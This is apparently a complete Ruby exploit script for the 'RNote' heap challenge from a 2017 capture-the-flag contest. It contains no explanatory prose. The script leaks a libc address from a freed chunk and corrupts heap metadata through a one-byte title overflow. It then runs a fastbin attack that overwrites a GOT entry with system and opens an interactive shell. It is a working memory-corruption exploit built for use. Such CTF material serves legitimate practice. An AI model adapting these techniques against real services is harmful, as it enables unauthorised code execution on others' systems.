#!/usr/bin/env ruby
# encoding: ascii-8bit
require_relative '../../zocket/zocket'
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

@magic = one_gadget(file: './libc.so.6')[5]

host, port = 'rnote.2017.teamrois.cn', 7777
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Zocket.new host, port #, logger: HexLogger.new
def z;$z;end
@p = 'RNote'
def h;@h ||= heapinfo(@p); @h.reload!;end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================

def pt;z.gets 'Your choice:'; end

def add(sz, content, title: "title\n")
  pt
  z.puts 1
  z.puts sz
  z.gets 'title: '
  z.write title
  z.gets 'content: '
  z.write content
end

def del(idx)
  pt
  z.puts 2
  z.puts idx
end

add(24, 'A' * 24)
add(160, 'B' * 160)
add(24, 'C' * 24, title: 'D' * 16 + 0x30.chr)

del(2)
pt; z.puts 3; z.puts 1
z.gets 'note content: '
libc = ELF.new('./libc.so.6')
libc.address = u64(z.read(6)+"\x00\x00") - 0x3c3b78
p "libc @ #{libc.address.hex}"
h.offset(libc.address)

add(160, 'Z' * 160) # consume

add(0x58, 'A' * 0x58)
add(0x58, 'B' * 0x58)
add(0x8, 'C' * 0x8, title: 'D' * 16 + 0.chr)
add(0x8, 'D' * 0x8, title: 'D' * 16 + 0x60.chr)

del(4)
del(5)
del(6)
del(7)


add(0x58, p64(0x602002 - 8).ljust(0x58, 'A'))
add(0x58, "C" * 0x58)
add(0x58, 'D' * 0x58)
add(0x58, 'E' * 6 + p64(0) * 1 + p64(libc.symbols.system))

add(3, "sh\x00")
del(8)

z.interact
